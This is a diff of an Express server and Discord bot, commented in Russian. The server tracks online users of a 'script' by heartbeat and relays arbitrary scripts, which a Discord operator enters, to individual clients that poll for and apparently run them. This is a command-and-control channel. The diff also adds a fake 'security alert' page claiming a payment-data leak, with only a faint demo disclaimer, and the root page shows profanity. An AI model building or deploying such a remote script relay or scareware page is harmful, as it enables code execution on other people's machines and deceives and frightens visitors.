@@ -30,23 +30,10 @@ const WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
 // DATA
 // ======================================================
 
-// Активные пользователи скрипта
-//
-// userId = {
-//     userId: "...",
-//     username: "...",
-//     lastSeen: 123456789
-// }
-
+// users[id] = { userId: "...", username: "...", lastSeen: 123456789 }
 const users = {};
 
-// Команды для конкретных клиентов
-//
-// userId = {
-//     text: "...",
-//     created: 123456789
-// }
-
+// commands[id] = { text: "...", created: 123456789 }
 const commands = {};
 
 // ======================================================
@@ -57,16 +44,19 @@ function validKey(key) {
     return API_KEYS.has(key);
 }
 
+// Фильтрует только тех, кто присылал heartbeat меньше 5 сек назад
+// НЕ удаляет данные втихую, чтобы сработал setInterval
 function getOnlineUsers() {
     const now = Date.now();
+    const activeUsers = {};
 
     for (const id in users) {
-        if (now - users[id].lastSeen > 30000) {
-            delete users[id];
+        if (now - users[id].lastSeen <= 5000) {
+            activeUsers[id] = users[id];
         }
     }
 
-    return users;
+    return activeUsers;
 }
 
 function getOnlineCount() {
@@ -94,11 +84,9 @@ async function sendWebhook(content) {
     try {
         const response = await fetch(WEBHOOK_URL, {
             method: "POST",
-
             headers: {
                 "Content-Type": "application/json"
             },
-
             body: JSON.stringify({
                 username: "Script Online",
                 content: content
@@ -132,55 +120,130 @@ function page(content, title = "Сайт") {
     <title>${title}</title>
 
     <style>
-        * {
-            box-sizing: border-box;
-        }
+        * { box-sizing: border-box; }
 
         body {
             margin: 0;
-            padding: 40px;
-            background: #000;
+            padding: 30px;
+            min-height: 100vh;
+            background: #050505;
             color: #fff;
             font-family: Arial, sans-serif;
         }
 
-        h1, h2, h3 {
-            color: #fff;
+        .alert {
+            max-width: 850px;
+            margin: 60px auto;
+            padding: 30px;
+            background: #0d0d0d;
+            border: 1px solid #8b0000;
+            box-shadow: 0 0 35px rgba(255, 0, 0, .15);
         }
 
-        p {
-            color: #fff;
+        .top {
+            color: #ff3030;
+            font-size: 13px;
+            font-weight: bold;
+            letter-spacing: 2px;
+            margin-bottom: 20px;
         }
 
-        a {
-            color: #fff;
+        h1 {
+            margin: 0;
+            font-size: 42px;
+            color: #ff3333;
         }
 
-        button,
-        input {
+        .message {
+            margin-top: 25px;
+            padding: 20px;
+            background: #170707;
+            border-left: 4px solid #ff2222;
+            color: #ffb0b0;
+            font-size: 18px;
+            line-height: 1.5;
+        }
+
+        .item {
+            margin-top: 15px;
+            padding: 15px;
             background: #111;
-            color: #fff;
-            border: 1px solid #444;
-            padding: 10px;
+            border: 1px solid #292929;
+        }
+
+        .item span {
+            color: #ff4444;
+            font-weight: bold;
+        }
+
+        .continue {
+            margin-top: 25px;
+            padding: 14px 25px;
+            background: #8b0000;
+            border: 1px solid #ff3333;
+            color: white;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        .continue:hover {
+            background: #c00000;
+        }
+
+        .demo {
+            margin-top: 25px;
+            color: #555;
+            font-size: 11px;
         }
     </style>
 </head>
 
 <body>
 
-    ${content}
+    <div class="alert">
+
+        <div class="top">● SECURITY SYSTEM / ALERT</div>
+
+        <h1>Обнаружена проблема</h1>
+
+        <div class="message">
+            ⚠ Потенциальная утечка данных обнаружена.
+            Некоторые сведения могли оказаться скомпрометированы.
+        </div>
+
+        <div class="item">
+            <span>Возможный объект:</span><br>
+            платёжные данные
+        </div>
+
+        <div class="item">
+            <span>Статус:</span><br>
+            требуется проверка
+        </div>
+
+        <div class="item">
+            <span>Источник:</span><br>
+            неизвестен
+        </div>
+
+        ${content}
+
+        <button class="continue" onclick="window.history.back()">
+            ← Закрыть страницу
+        </button>
+
+        <div class="demo">
+            Демонстрационное предупреждение. Не является реальным уведомлением
+            банка или службы безопасности.
+        </div>
+
+    </div>
 
     <script>
         const titles = [
-            "i",
-            "id",
-            "idi",
-            "idi ",
-            "idi n",
-            "idi na",
-            "idi nah",
-            "idi nahu",
-            "idi nahui"
+            "⚠ SECURITY ALERT",
+            "⚠ DATA WARNING",
+            "⚠ CHECK REQUIRED"
         ];
 
         let i = 0;
@@ -188,7 +251,7 @@ function page(content, title = "Сайт") {
         setInterval(() => {
             document.title = titles[i];
             i = (i + 1) % titles.length;
-        }, 200);
+        }, 700);
     </script>
 
 </body>
@@ -203,26 +266,14 @@ function page(content, title = "Сайт") {
 app.get("/", (req, res) => {
     res.send(page(`
         <h1>IDI NAHUI</h1>
-
         <p>idi!</p>
-
         <p>nahui</p>
-
         <p>idi nahui</p>
     `, "^_____^"));
 });
 
 // ======================================================
 // SCRIPT PRESENCE
-//
-// join:
-// /presence?key=KEY-123&action=join&userId=123&username=Player
-//
-// heartbeat:
-// /presence?key=KEY-123&action=heartbeat&userId=123&username=Player
-//
-// leave:
-// /presence?key=KEY-123&action=leave&userId=123&username=Player
 // ======================================================
 
 app.get("/presence", async (req, res) => {
@@ -246,10 +297,7 @@ app.get("/presence", async (req, res) => {
     const id = String(userId);
     const name = String(username);
 
-    // ==================================================
     // JOIN
-    // ==================================================
-
     if (action === "join") {
         const alreadyOnline = users[id] !== undefined;
 
@@ -261,7 +309,6 @@ app.get("/presence", async (req, res) => {
 
         const online = getOnlineCount();
 
-        // Отправляем webhook только при новом входе
         if (!alreadyOnline) {
             const onlineList = getOnlineList();
 
@@ -286,10 +333,7 @@ app.get("/presence", async (req, res) => {
         });
     }
 
-    // ==================================================
     // HEARTBEAT
-    // ==================================================
-
     if (action === "heartbeat") {
         users[id] = {
             userId: id,
@@ -303,19 +347,13 @@ app.get("/presence", async (req, res) => {
         });
     }
 
-    // ==================================================
     // LEAVE
-    // ==================================================
-
     if (action === "leave") {
         const existed = users[id] !== undefined;
-
         delete users[id];
 
         const online = getOnlineCount();
 
-        // Отправляем webhook только если пользователь
-        // действительно был в списке
         if (existed) {
             const onlineList = getOnlineList();
 
@@ -340,13 +378,7 @@ app.get("/presence", async (req, res) => {
 });
 
 // ======================================================
-// COMMAND
-//
-// API:
-// /command?key=KEY-123&user=123456&text=Hello
-//
-// Внутри сервера команда всегда хранится как:
-// commands[user].text
+// COMMANDS
 // ======================================================
 
 app.get("/command", (req, res) => {
@@ -378,17 +410,6 @@ app.get("/command", (req, res) => {
     });
 });
 
-// ======================================================
-// GET COMMAND
-//
-// /get?key=KEY-123&user=123456
-//
-// Клиент получает:
-// {
-//     "text": "..."
-// }
-// ======================================================
-
 app.get("/get", (req, res) => {
     const key = req.query.key;
     const user = req.query.user;
@@ -418,23 +439,20 @@ app.get("/get", (req, res) => {
 });
 
 // ======================================================
-// CLEANUP
+// CLEANUP & TIMEOUT (1 секунда интервал, 5 секунд таймаут)
 // ======================================================
 
 setInterval(async () => {
     const now = Date.now();
 
-    // ==============================================
-    // Удаляем пользователей, которые не отправляли
-    // heartbeat больше 30 секунд
-    // ==============================================
-
+    // 1. Проверяем таймаут игроков
     for (const id in users) {
         const user = users[id];
 
-        if (now - user.lastSeen > 30000) {
+        if (now - user.lastSeen > 5000) {
             const username = user.username;
 
+            // Удаляем пользователя
             delete users[id];
 
             const online = getOnlineCount();
@@ -444,7 +462,7 @@ setInterval(async () => {
                 `🔴 **Игрок отключился**\n\n` +
                 `**Ник:** ${username}\n` +
                 `**ID:** ${id}\n` +
-                `**Причина:** heartbeat timeout\n` +
+                `**Причина:** heartbeat timeout (>5s)\n` +
                 `**Сейчас онлайн:** ${online}\n\n` +
                 `👥 **Кто остался в сети:**\n` +
                 `${onlineList}`
@@ -452,17 +470,14 @@ setInterval(async () => {
         }
     }
 
-    // ==============================================
-    // Удаляем старые команды
-    // ==============================================
-
+    // 2. Удаляем старые команды (старше 5 минут)
     for (const id in commands) {
         if (now - commands[id].created > 300000) {
             delete commands[id];
         }
     }
 
-}, 10000);
+}, 1000);
 
 // ======================================================
 // DISCORD BOT
@@ -478,34 +493,20 @@ const discord = new Client({
     ]
 });
 
-// ======================================================
-// REGISTER /COMMAND
-// ======================================================
-
 async function registerDiscordCommands() {
-    if (!DISCORD_TOKEN) {
-        throw new Error("Missing DISCORD_TOKEN");
-    }
-
-    if (!DISCORD_CLIENT_ID) {
-        throw new Error("Missing DISCORD_CLIENT_ID");
-    }
-
-    if (!DISCORD_GUILD_ID) {
-        throw new Error("Missing DISCORD_GUILD_ID");
+    if (!DISCORD_TOKEN || !DISCORD_CLIENT_ID || !DISCORD_GUILD_ID) {
+        throw new Error("Missing Discord Configuration");
     }
 
     const command = new SlashCommandBuilder()
         .setName("command")
         .setDescription("Передать скрипт клиенту")
-
         .addStringOption(option =>
             option
                 .setName("id")
                 .setDescription("ID игрока")
                 .setRequired(true)
         )
-
         .addStringOption(option =>
             option
                 .setName("script")
@@ -513,9 +514,7 @@ async function registerDiscordCommands() {
                 .setRequired(true)
         );
 
-    const rest = new REST({
-        version: "10"
-    }).setToken(DISCORD_TOKEN);
+    const rest = new REST({ version: "10" }).setToken(DISCORD_TOKEN);
 
     await rest.put(
         Routes.applicationGuildCommands(
@@ -532,50 +531,35 @@ async function registerDiscordCommands() {
     console.log("Discord /command registered");
 }
 
-// ======================================================
-// DISCORD INTERACTIONS
-// ======================================================
-
 discord.on("interactionCreate", async interaction => {
-    if (!interaction.isChatInputCommand()) {
-        return;
+    if (!interaction.isChatInputCommand()) return;
+
+    if (interaction.commandName === "command") {
+        const id = interaction.options.getString("id");
+        const script = interaction.options.getString("script");
+
+        commands[String(id)] = {
+            text: String(script),
+            created: Date.now()
+        };
+
+        console.log(`[DISCORD] -> Player ${id}: ${script}`);
+
+        await interaction.reply({
+            content:
+                `ID Player: **${id}**\n` +
+                `Script executing: \`${script}\``
+        });
     }
-
-    if (interaction.commandName !== "command") {
-        return;
-    }
-
-    const id = interaction.options.getString("id");
-    const script = interaction.options.getString("script");
-
-    // ВАЖНО:
-    // Discord использует "script",
-    // но клиентская система по-прежнему использует "text".
-    commands[String(id)] = {
-        text: String(script),
-        created: Date.now()
-    };
-
-    console.log(`[DISCORD] ${id}: ${script}`);
-
-    await interaction.reply({
-        content:
-            `ID Player: **${id}**\n` +
-            `Script executing: \`${script}\``
-    });
 });
 
 // ======================================================
-// START HTTP SERVER
+// START SERVICES
 // ======================================================
 
 app.listen(PORT, () => {
     console.log(`HTTP server started on port ${PORT}`);
 });
-
-// ======================================================
-// START DISCORD
-// ======================================================
 
 async function startDiscord() {
     if (!DISCORD_TOKEN) {
@@ -584,17 +568,11 @@ async function startDiscord() {
     }
 
     await discord.login(DISCORD_TOKEN);
-
-    console.log(
-        `Discord bot logged in as ${discord.user.tag}`
-    );
+    console.log(`Discord bot logged in as ${discord.user.tag}`);
 
     await registerDiscordCommands();
-
-    console.log("Discord /command registered");
 }
 
 startDiscord().catch(error => {
-    console.error("Discord startup error:");
-    console.error(error);
+    console.error("Discord startup error:", error);
 });
